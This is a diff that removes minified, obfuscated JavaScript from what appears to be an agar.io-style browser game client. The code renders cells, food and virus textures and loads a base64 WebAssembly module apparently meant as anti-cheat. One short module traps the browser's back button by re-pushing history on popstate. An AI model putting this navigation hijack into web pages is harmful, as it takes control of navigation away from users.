-                        this.container = new s.Container, this.background = new s.Container, this.foreground = new s.Container, this.food = new s.Container, this.backgroundSprite = null, this.game = $, this.border = e, this.food.visible = x.A.get("foodVisible"), this.borderGraphic = i(e), this.background.addChild(this.borderGraphic), this.container.addChild(this.background, this.food, this.foreground), this.foreground.alpha = x.A.get("cellsOpacity"), this.xbf(!1), this.idx(), s.utils.isWebGLSupported() && x.A.get("useWebGL") && x.A.get("showBackgroundImage") && this.qfG(), this.background.position.x = e.x, this.background.position.y = e.y
-                    }
-                    idx() {
-                        this.container.position.set(window.innerWidth / 2, window.innerHeight / 2)
-                    }
-                    sort() {
-                        var $, e;
-                        this.foreground.children.sort((t, x) => ($ = t.gameData, e = x.gameData, $.context !== e.context || $.Fwk !== e.Fwk ? $.Fwk - e.Fwk : $.id - e.id))
-                    }
-                    Oyb($) {
-                        this.foreground.addChild($)
-                    }
-                    TIc($) {
-                        this.food.addChild($)
-                    }
-                    qfG() {
-                        var $ = x.A.get("backgroundImageUrl");
-                        if (!$) return this.BdI();
-                        var e = this.border,
-                            $ = (x.A.get("backgroundImageRepeat") ? s.TilingSprite : s.Sprite).from($, {}),
-                            t = ($.width = e.width, $.height = e.height, $.alpha = x.A.get("backgroundImageOpacity"), $.anchor.set(.5), this.backgroundSprite);
-                        t && (t = $.texture !== t.texture, this.BdI(t)), this.backgroundSprite = $, this.background.addChildAt($, 0), e.circle && ({
-                            width: t,
-                            height: $
-                        } = e, (e = new s.Graphics().beginFill(16777215).drawEllipse(t / 2, $ / 2, t / 2, $ / 2).endFill()).pivot.set(t / 2, $ / 2), this.background.addChildAt(e, 1), this.backgroundSprite.mask = e)
-                    }
-                    BdI($ = !1) {
-                        this.backgroundSprite && (this.backgroundSprite.destroy({
-                            children: $,
-                            texture: $,
-                            baseTexture: $
-                        }), this.backgroundSprite = null)
-                    }
-                    MZc($) {
-                        $ && !this.backgroundSprite ? this.qfG() : $ || this.BdI(!0)
-                    }
-                    rejlr() {
-                        this.borderGraphic.destroy(), this.borderGraphic = i(this.border), this.background.addChild(this.borderGraphic)
-                    }
-                    xbf($) {
-                        $ && this.Ahq(), s.BitmapFont.from("mass", x.A.jLt, {
-                            chars: "1234567890km."
-                        });
-                        for (var e = this.game.UJM; e.length;) e.pop().destroy(!1);
-                        this.game.VTJ.forEach($ => {
-                            $.SoH && ($.sprite.removeChild($.SoH), pc.SoH.destroy(!1), delete $.SoH)
-                        })
-                    }
-                    Ahq() {
-                        s.BitmapFont.uninstall("mass")
-                    }
-                }
-            },
-            626($, e, t) {
-                t.d(e, {
-                    A: () => a
-                });
-                var x = t(15308),
-                    s = t(95514),
-                    i = t(98104),
-                    n = t(87706);
-                class a {
-                    constructor() {
-                        this.texture = n.RenderTexture.create({
-                            width: 256,
-                            height: 256
-                        })
-                    }
-                    async load($) {
-                        if (!this.loading) {
-                            this.loading = !0;
-                            try {
-                                var e = await n.Texture.fromURL($ = $.startsWith("data:image") ? $ : await (0, i.T)($), {
-                                        width: 256,
-                                        height: 256
-                                    }),
-                                    t = n.Sprite.from(e);
-                                s.Uk.render(t, this.texture, !0), (0, x.$s)(0, "Loaded static arrow texture")
-                            } catch (a) {
-                                (0, x.$s)(1, "Failed to load static arrow texture (URL='" + $ + "')"), console.error(a)
-                            }
-                            delete this.loading
-                        }
-                    }
-                    get() {
-                        return this.texture
-                    }
-                }
-            },
-            50290($, e, t) {
-                t.d(e, {
-                    A: () => x
-                });
-                class x {
-                    constructor($) {
-                        this.cache = new Map, this.size = $
-                    }
-                    reset() {
-                        this.cache.forEach($ => $.destroy(!0)), this.cache.clear()
-                    }
-                }
-            },
-            92839($, e, t) {
-                t.d(e, {
-                    A: () => n
-                });
-                var x = t(83529),
-                    s = t(95514),
-                    e = t(50290),
-                    i = t(87706);
-                class n extends e.A {
-                    constructor() {
-                        super(x.A.GAS), this.kDA = x.A.GAS / 2
-                    }
-                    get($, e = !0) {
-                        var t, x, n, a = this.cache;
-                        return a.has($) ? a.get($) : ({
-                            kDA: n,
-                            size: t
-                        } = this, (x = new i.Graphics().beginFill($).drawCircle(0, 0, n).endFill()).position.set(n), n = i.RenderTexture.create({
-                            width: t,
-                            height: t
-                        }), a.set($, n), e && s.Uk.render(x, n), n)
-                    }
-                }
-            },
-            23059($, e, t) {
-                t.d(e, {
-                    $P: () => l,
-                    Tb: () => r,
-                    WK: () => a,
-                    lw: () => o
-                });
-                let x = t(626),
-                    s = t(92839),
-                    i = t(88060),
-                    n = t(84530),
-                    a = new s.A,
-                    o = new i.A,
-                    r = new n.A,
-                    l = new x.A
-            },
-            88060($, e, t) {
-                t.d(e, {
-                    A: () => n
-                });
-                var x = t(83529),
-                    s = t(95514),
-                    e = t(50290),
-                    i = t(87706);
-                class n extends e.A {
-                    constructor() {
-                        super(x.A.GAS), this.kDA = x.A.GAS / 2
-                    }
-                    get($, e = !0) {
-                        var t, x, n, a = this.cache;
-                        return a.has($) ? a.get($) : ({
-                            kDA: n,
-                            size: t
-                        } = this, (x = new i.Graphics().beginFill($).drawRect(-n, -n, 2 * n, 2 * n).endFill()).position.set(n), n = i.RenderTexture.create({
-                            width: t,
-                            height: t
-                        }), a.set($, n), e && s.Uk.render(x, n), n)
-                    }
-                }
-            },
-            84530($, e, t) {
-                t.d(e, {
-                    A: () => a
-                });
-                var x = t(15308),
-                    s = t(95514),
-                    i = t(98104),
-                    n = t(87706);
-                class a {
-                    constructor() {
-                        this.texture = n.RenderTexture.create({
-                            width: 200,
-                            height: 200
-                        })
-                    }
-                    async load($) {
-                        if (!this.loading) {
-                            this.loading = !0;
-                            try {
-                                var e = await n.Texture.fromURL($ = $.startsWith("data:image") ? $ : await (0, i.T)($), {
-                                        width: 200,
-                                        height: 200
-                                    }),
-                                    t = n.Sprite.from(e);
-                                s.Uk.render(t, this.texture, !0), (0, x.$s)(0, "Loaded static virus texture")
-                            } catch (a) {
-                                (0, x.$s)(1, "Failed to load static virus texture (URL='" + $ + "')"), console.error(a)
-                            }
-                            delete this.loading
-                        }
-                    }
-                    get() {
-                        return this.texture
-                    }
-                }
-            },
-            98104($, e, t) {
-                t.d(e, {
-                    T: () => s
-                });
-                var x = t(15308);
-                let s = async $ => {
-                    let e;
-                    try {
-                        var t = await fetch($);
-                        if (!t.ok) throw Error("Failed to fetch image (status code: " + t.status + ")");
-                        e = await t.blob()
-                    } catch (s) {
-                        return t = "string" == typeof s ? s : s.message || "", (0, x.$s)(1, 'Fetching of image URL "' + $ + '" failed' + (t ? ": " + t : "")), null
-                    }
-                    return new Promise($ => {
-                        let t = new FileReader;
-                        t.addEventListener("load", () => $(t.result), !1), t.addEventListener("error", () => $(null)), t.readAsDataURL(e)
-                    })
-                }
-            },
-            94121() {
-                try {
-                    history.pushState(null, null, location.href), window.addEventListener("popstate", () => history.go(1))
-                } catch ($) {}
-            },
-            30608($, e, t) {
-                if ("performance" in (t = "object" == typeof window ? window : t.g) || (t.performance = {}), !("now" in t.performance) || "function" != typeof performance.now) {
-                    let x = Date.now();
-                    t.performance.now = function() {
-                        return Date.now() - x
-                    }
-                }
-            },
-            63836($, e, t) {
-                t.d(e, {
-                    GS: () => u,
-                    TO: () => p,
-                    gp: () => C,
-                    k9: () => d,
-                    vF: () => m,
-                    vV: () => g,
-                    yc: () => A
-                });
-                var x = t(95195),
-                    s = t(78225),
-                    i = t(83529),
-                    n = t(15308),
-                    a = t(70679),
-                    o = t(19659),
-                    r = t(1786);
-                let l = new Map([
-                        [o.Sq, r.ub],
-                        [o.rn, r.hN],
-                        [o.QG, r.Oe]
-                    ]),
-                    c, h, A = ($, e) => {
-                        c = $, h = e
-                    },
-                    u = ($, e, t, s, i, n, A, u, d) => {
-                        var g = 15 & e;
-                        let m;
-                        switch (g) {
-                            case o.Sq:
-                            case o.rn:
-                            case o.QG:
-                                var C = l.get(g);
-                                m = new C(s, n, i, A, u, $);
-                                break;
-                            case o.do:
-                                (m = new r.xx(s, n, i, c.eyl, u, $)).sprite.width = m.sprite.height = 2 * c.eyl;
-                                break;
-                            case o.g4:
-                                if (!(C = x.A.FCi.get(t))) return;
-                                m = new r.kF(s, n, i, A, u, C, $);
-                                break;
-                            case o.hH:
-                                (m = new r.hN(s, n, i, A, u, $)).sprite.alpha = 1;
-                                break;
-                            case o.xV:
-                                64 & e && (A = c.zVF + s % c.MgU), 32 & e && (n = h.minx + A + (h.width - 2 * A) * x.A.MOW(65536 + s), i = h.miny + A + (h.height - 2 * A) * x.A.MOW(131072 + s)), (m = new r.No(s, n, i, A, u, $)).sprite.width = m.sprite.height = 2 * A;
-                                break;
-                            default:
-                                m = new r.hN(s, n, i, A, u, $, !(16 & u), (128 & u ? 7340032 : 0) | (64 & u ? 28672 : 0) | (32 & u ? 112 : 0) || 4210752)
-                        }
-                        m.EZD.own($), a.Ab.set(s, m), x.A.scene[1 & u ? "TIc" : "Oyb"](m.sprite), m.tQY[$] = x.A.GAB, a.DH.add(m), x.A.ykh?.($, m)
-                    },
-                    d = ($, e, t, s, i, n, o) => {
-                        (t = a.Ab.get(t)) && (t.update(x.A.GAB), t.Fql.set(t.position), t.Fwk = t.size, 32 & e || t.ytG.set(i, s), 64 & e || (t.dxt = n), t.tQY[$] = x.A.GAB, x.A.uMe?.($, t))
-                    },
-                    g = ($, e) => {
-                        (e = a.Ab.get(e)) && !e.EZD.migrate($) && (e.destroy(), x.A.nvk?.($, e))
-                    },
-                    m = ($, e, t) => {
-                        if ((e = a.Ab.get(e)) && 0 !== e.EZD.size) return e.EZD.clear(), (e.exG || e.rDK) && (t = a.Ab.get(t)) ? (e.update(e.tQY[$] = x.A.GAB), e.destroy(s.A.rendering && i.A.get("eatAnimation")), e.ytG.set(t.ytG), e.scale = (0, n.N)(e.size / t.dxt, 0, 1), e.dxt = 0, void x.A.RYB?.($, e, t)) : e.destroy()
-                    },
-                    C = ($, e) => (e = a.Ab.get(e)) instanceof r.kF ? e.pid : 0,
-                    p = ($, e) => (e = a.Ab.get(e)) ? (2 === x.A.oiz && e.EZD.own($), 1) : 0
-            },
-            19437($, e, t) {
-                t.d(e, {
-                    f: () => o
-                });
-                var x = t(78225),
-                    s = t(63836),
-                    i = t(30847);
-                [, ].fill("Hello there, script-kiddie. Looking for anything?");
-                let n, a = new class {
-                        async init() {
-                            if (this.initializing || null != this.instance) return !1;
-                            this.initializing = !0;
-                            var $ = await fetch(n = "data:application/wasm;base64,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"),
-                                e = {
-                                    env: {
-                                        add: s.GS,
-                                        update: s.k9,
-                                        has: s.TO,
-                                        destroy: s.vV,
-                                        eat: s.vF,
-                                        pidOf: s.gp,
